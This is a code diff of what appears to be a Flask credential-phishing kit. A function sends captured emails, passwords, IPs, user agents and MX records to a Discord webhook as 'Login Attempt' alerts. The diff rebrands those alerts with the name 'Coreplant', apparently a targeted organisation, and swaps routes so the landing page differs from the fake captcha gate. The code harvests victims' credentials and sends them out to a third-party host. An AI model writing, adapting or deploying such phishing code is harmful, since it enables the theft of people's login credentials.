@@ -30,7 +30,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
         "embeds": [
             {
-                "title": "🔔 GENERAL Login Attempt",
+                "title": "🔔 Coreplant Login Attempt",
                 "color": 16711680,  # Red color in Discord embed
                 "fields": [
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
@@ -166,7 +166,7 @@ def generate_captcha_image(code):
     # Convert the image to base64 string to pass to the HTML
     return base64.b64encode(img_io.getvalue()).decode('utf-8')
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/m', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         if 'passed_captcha' in session and session['passed_captcha']:
@@ -213,7 +213,7 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/m")
+@app.route("/")
 def route2():
     web_param = request.args.get('web')
     if web_param:
